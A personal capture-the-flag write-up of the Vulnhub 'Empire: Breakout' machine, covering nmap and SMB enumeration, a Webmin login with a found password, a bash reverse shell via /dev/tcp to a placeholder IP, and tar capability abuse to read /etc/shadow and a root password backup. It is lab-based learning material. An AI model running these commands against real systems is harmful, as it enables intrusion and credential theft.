# Empire: Breakout

This is a easy vulnerable machine I did from vulnhub. It was easy but it took me a little longer than I expected and I learned quite a lot.  This post is in the format of my notes.

[Empire: Breakout from Vulnhub](https://www.vulnhub.com/entry/empire-breakout,751/)

I started off with an arp-scan

`arp-scan x.x.x.x/24`

![111](https://user-images.githubusercontent.com/55252902/152678895-3280b6cd-5b94-4186-9e56-79725da20695.JPG)

# Nmap Scan

`nmap -T4 -A -p- 192.168.174.130`

> nmap -T4 -A -p- 192.168.174.130 1 ⨯
> Starting Nmap 7.92 ( [](https://nmap.org/)https://nmap.org ) at 2022-02-01 16:49 EST
> Nmap scan report for 192.168.174.130
> Host is up (0.0011s latency).
> Not shown: 65530 closed tcp ports (reset)
> PORT STATE SERVICE VERSION
> 80/tcp open http Apache httpd 2.4.51 ((Debian))
> |_http-server-header: Apache/2.4.51 (Debian)
> |_http-title: Apache2 Debian Default Page: It works
> 139/tcp open netbios-ssn Samba smbd 4.6.2
> 445/tcp open netbios-ssn Samba smbd 4.6.2
> 10000/tcp open http MiniServ 1.981 (Webmin httpd)
> |_http-title: 200 — Document follows
> 20000/tcp open http MiniServ 1.830 (Webmin httpd)
> |_http-title: 200 — Document follows
> MAC Address: 00:0C:29:26:73:A1 (VMware)
> Device type: general purpose
> Running: Linux 4.X|5.X
> OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
> OS details: Linux 4.15 - 5.6
> Network Distance: 1 hop
> 
> Host script results:
> | smb2-security-mode:
> | 3.1.1:
> |_ Message signing enabled but not required
> | smb2-time:
> | date: 2022-02-01T21:50:12
> |_ start_date: N/A
> |_nbstat: NetBIOS name: BREAKOUT, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

# Information Gathering and Disclosure

![Untitled](https://user-images.githubusercontent.com/55252902/153281075-cdd188ad-3ea9-427d-a73e-ce15d848efb4.png)

Apache Default Webpage Version - 2.4.51 httpd (Debian) (poor hygiene)

Viewing the page source on this default page I noticed that you could keep scrolling down. Normally it would end when the code ends, but I was able to keep scrolling down and I found this. Some encrypted text, I am going to attempt to decrypt this.
  
![Untitled 1](https://user-images.githubusercontent.com/55252902/152678982-851d6ffa-274a-4f53-9746-9c3145105f2a.png)
  
  ![Untitled 2](https://user-images.githubusercontent.com/55252902/152678984-48a96d0a-1ed1-4d97-9ec3-cae89c0615ef.png)
 
![Untitled 3](https://user-images.githubusercontent.com/55252902/152678999-39ceebfd-ff95-466c-9577-b52d736d8e7d.png)


Decoded - > ~~CENSORED~~ | Looks like a password, will save this for later.

# Enumerating http/https

From the NMAP scans I saw that these two ports were open and running a web app with two different versions

10000/tcp open http MiniServ 1.981 (Webmin httpd)

20000/tcp open http MiniServ 1.830 (Webmin httpd)

## What is Webmin?

> Usermin is a web-based interface for webmail, password changing, mail filters, fetchmail and much more. It is designed for use by regular non-root users on a Unix system, and limits them to tasks that they would be able to perform if logged in via SSH or at the console. See the standard modules page for a list of all the functions built into Usermin.

*Navigating to this URL It takes me from an HTTP page (Error — Document follows - This web server is running in SSL mode*. *Try the URL https://192.168.174.130:20000/ instead)* and redirects me to this log in page that is in HTTPS (SSL). Same thing happens for https://192.168.174.130:10000. I visited the 20000 port first because it is running an earlier version of Webmin.
  
![Untitled 4](https://user-images.githubusercontent.com/55252902/152679016-363b3a5e-5b65-4244-9911-27bc8350b1ee.png)
  
![Untitled 5](https://user-images.githubusercontent.com/55252902/152679024-c715d4ec-6324-40d7-82a0-531a967e9df2.png)
  



This web server has two log in pages at port 10000 and port 20000.

Two different versions of Webmin are being run

> From a google search I found “ According to the Webmin team, all versions between 1.882 to 1.921 downloaded from Sourceforge contained the malicious backdoor code. “

I will begin with 192.168.174.130:20000 since it is running an earlier version of Webmin.
  
![Untitled 6](https://user-images.githubusercontent.com/55252902/152679043-91df0d2a-1aec-4ab8-acc6-986fe727d0e1.png)

Through a google search I found this page /password_change.cgi

## Enumerating SMB

```
nmap -sC -p139,445 -sV IP
```
![Untitled 7](https://user-images.githubusercontent.com/55252902/152679060-1394f9b0-1d1f-47b5-ba3b-7e6c576da874.png)



From the nmap scan SMB is open on both ports 139 and 445 | Samba smbd 4.6.2

I attempted to manually see if I could access SMB.

On smb://192.168.174.130:139 - it failed

On smb://192.168.174.130:445 - I got in and there was nothing there or not shown | Windows share
  
![Untitled 8](https://user-images.githubusercontent.com/55252902/152679072-3b78dc97-1184-4069-bf2f-24e98c90565b.png)
  
![Untitled 9](https://user-images.githubusercontent.com/55252902/152679076-c633b1aa-2621-4e50-8b59-1c6144a1d7d1.png)
 
![Untitled 10](https://user-images.githubusercontent.com/55252902/152679083-f6fbefcc-fe64-4a0c-abe6-ec29e68a9d37.png)
 
Googling and searching ways of enumerating SMB I came across a tool called enum4linux. It enumerates information for Windows and Samba systems. This tool gathers a lot of information and I quite like it, I think this a tool that I will using quite a bit.

 ![Untitled 12](https://user-images.githubusercontent.com/55252902/152679116-86bb9f84-7011-441f-89e1-f55f64e0e01a.png)
 
 ![Untitled 13](https://user-images.githubusercontent.com/55252902/152679121-f70130cf-2228-416e-b484-d311d3f1433c.png)

 ![Untitled 14](https://user-images.githubusercontent.com/55252902/152679123-36a4c258-f455-4956-924b-41edf63261a3.png)
 

This is information that stuck out to me and caught my eye, most especially in the second screen shot above (2/3) there is a local user - cyber.

So I have a local user named cyber, maybe I can try to log in somewhere? What comes to mind are those log in pages from earlier.

What also comes to mind is the decrypted message I got earlier from the Apache default webpage → view source → ~~CENSOREDPASSWORD~~

I already tried default/common credentials on both log in pages with no success.

https://192.168.174.130:10000

https://192.168.174.130:20000

I tried user: cyber | password: ~~CENSOREDPASSWORD~~ on [](https://192.168.174.130:10000)https://192.168.174.130:10000 and login failed

I went to [](https://192.168.174.130:20000)https://192.168.174.130:20000 next and got a successful log in.

## I'm in
  
![Untitled 15](https://user-images.githubusercontent.com/55252902/152679129-9b5d23c8-fcf8-43a7-944e-5ff6c530bedf.png)

Going to go through this and see what I can find.
  
![Untitled 16](https://user-images.githubusercontent.com/55252902/152679132-8d2e21f3-3fb5-4e54-a745-bba65ef66b8d.png)

Account information page
  
![Untitled 17](https://user-images.githubusercontent.com/55252902/152679139-532cb25f-282a-429e-9620-4fec0182d2cf.png)

Under applications you can upload and download files.

![Untitled 18](https://user-images.githubusercontent.com/55252902/152679150-37b7f85b-3168-4ba3-bc26-60efade8ac5b.png)

But at the very bottom there is something even more interesting, a command line, shell access from this local user. Time for a reverse shell.

# Exploitation

I am going to begin exploiting though the local users command line interface.

![Untitled](https://user-images.githubusercontent.com/55252902/152679157-501dc346-5444-497b-871d-cfffd849e94a.png)

```
nc -nvlp 4444
```
  
Host a webserver 

![Untitled 1](https://user-images.githubusercontent.com/55252902/152679165-d0a023b9-3119-4599-bafd-fee088eb1726.png)

Reverse shell with bash

```bash
sh -i >& /dev/tcp/replacewithIP/replacewithportnumber 0>&1
```

![Untitled 2](https://user-images.githubusercontent.com/55252902/152679168-3de23bf3-9534-490f-9d3e-763e61b29c8b.png)
![Untitled 3](https://user-images.githubusercontent.com/55252902/152679175-dbc6f551-636c-4428-82b3-c2f588c7b7bb.png)
![Untitled 4](https://user-images.githubusercontent.com/55252902/152679181-696b2d6a-c091-4e3e-8127-6dd0e07fbdd3.png)
![Untitled 5](https://user-images.githubusercontent.com/55252902/152679183-02ef197a-8510-4b84-a47b-694dc92459a5.png)


 


Root directory
  
![Untitled 6](https://user-images.githubusercontent.com/55252902/152679201-0aff401c-f9cb-4e52-8ae3-81d8e6e82119.png)

I had to google around to see what I can do from here and the first two searches of ‘cap_dac_read_search=ep’ are about privilege escalation.

nstead of doing it the way I did you can do a recursive search through the whole system with the following command

```
getcap -r / 2>/dev/null
```

### Flag

- -r stands for recursive search

- / search the whole system

tar is a binary, use getcap to display capabilities of this binary file.

[Privlege escalation vector getcap - An Interesting Privilege Escalation vector](https://nxnjz.net/2018/08/an-interesting-privilege-escalation-vector-getcap/)

[Linux privlege escalation using capabilities](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/)

To sum it up ‘cap_dac_read_search’, tar has read access to anything, we can read stuff that requires root access.

### etc/shadow

```
./tar -cvf shadow.tar /etc/shadow
```

./tar: Removing leading `/’ from member names /etc/shadow

```
./tar: Removing leading `/’ from member names /etc/shadow
```

```
cat etc/shadow
```
![Untitled 7](https://user-images.githubusercontent.com/55252902/152679206-64287f10-a4dc-4f02-b00e-5e9acadcaa82.png)

# Exploitation
  
![Untitled 8](https://user-images.githubusercontent.com/55252902/152679212-891a2340-e49b-45c9-b1bf-ff4815b3c098.png)
![Untitled 9](https://user-images.githubusercontent.com/55252902/152679215-26111a1a-f198-4b25-98ce-bc7031065499.png)

From root directory to /var to see if there are any logs, what caught my attention first is the backups directory.

![Untitled 10](https://user-images.githubusercontent.com/55252902/152679219-3bbc97d4-4dc5-43bf-9fe3-c6ccddc08176.png)
![Untitled 11](https://user-images.githubusercontent.com/55252902/152679224-ee0291a3-5d7f-44cf-8fd7-679b092a6dd2.png)

.old_pass.bak? Can’t read, need root access, I am going to privilege escalation capability discovered earlier.
  
![Untitled 12](https://user-images.githubusercontent.com/55252902/152679232-d8051142-b04e-4e98-8d3b-534b8ef61d2e.png)

Got the password

![Untitled 13](https://user-images.githubusercontent.com/55252902/152679240-d355c726-b605-4c11-af03-6d5ebebbd7cf.png)

Root!, there was a r00t.txt but it wasn’t letting me cat it out for some reason, I could’ve directly logged into the machine it self but that’s alright.

# Conclusion

This was a fun machine for sure. It was labeled as easy and it was, but it had somethings that caught me by surprise and honestly taught me a lot. I got stuck once I did the reverse shell on the local user. I was searching around trying to see what was vulnerable and what I could do. I tried to download linPEAS into the local host but I was getting connection failed with wget and I couldn’t use curl. Thinking about it now as I write this, I think there was another way I could’ve done it. Either way, through some extensive google searching and such I discovered the getcap privilege escalation vulnerability for Linux and took good notes on that. Overall, a very fun machine and I can’t wait to get started on the next.
